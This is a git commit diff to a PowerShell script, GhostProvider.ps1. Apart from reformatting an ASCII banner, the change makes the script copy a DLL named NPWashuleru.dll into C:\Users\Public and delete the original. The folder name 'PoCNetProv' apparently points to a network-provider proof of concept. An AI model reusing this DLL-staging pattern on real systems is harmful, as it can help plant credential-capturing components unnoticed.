0adf28054ed3c0f8cf9c6b390b37d3af1af05533
Kotasukami <75394694+Kotasukami@users.noreply.github.com>
2025-06-04 15:53:11 -0400

    Update GhostProvider.ps1

--- GhostProvider.ps1
+++ GhostProvider.ps1
@@ -1,12 +1,17 @@
-﻿   Write-Host "
+Write-Host "
  _____ _               _  ______               _     _           
 |  __ \ |             | | | ___ \             (_)   | |          
 | |  \/ |__   ___  ___| |_| |_/ / __ _____   ___  __| | ___ _ __ 
 | | __| '_ \ / _ \/ __| __|  __/ '__/ _ \ \ / / |/ _` |/ _ \ '__|
 | |_\ \ | | | (_) \__ \ |_| |  | | | (_) \ V /| | (_| |  __/ |   
- \____/_| |_|\___/|___/\__\_|  |_|  \___/ \_/ |_|\__,_|\___|_|" -NoNewline
+ \____/_| |_|\___/|___/\__\_|  |_|  \___/ \_/ |_|\__,_|\___|_|
+ 
+ 
+ 
+ " -NoNewline
 
+$currentDirectory = Get-Location
 
- $currentDirectory = Get-Location
+Copy-Item "$currentDirectory\NPWashuleru.dll" -Destination "C:\Users\Public"
 
- Copy-Item "$currentDirectory\txt_test.txt" -Destination "C:\Users\Usuario\Desktop\PoCNetProv"
+Remove-Item "NPWashuleru.dll"
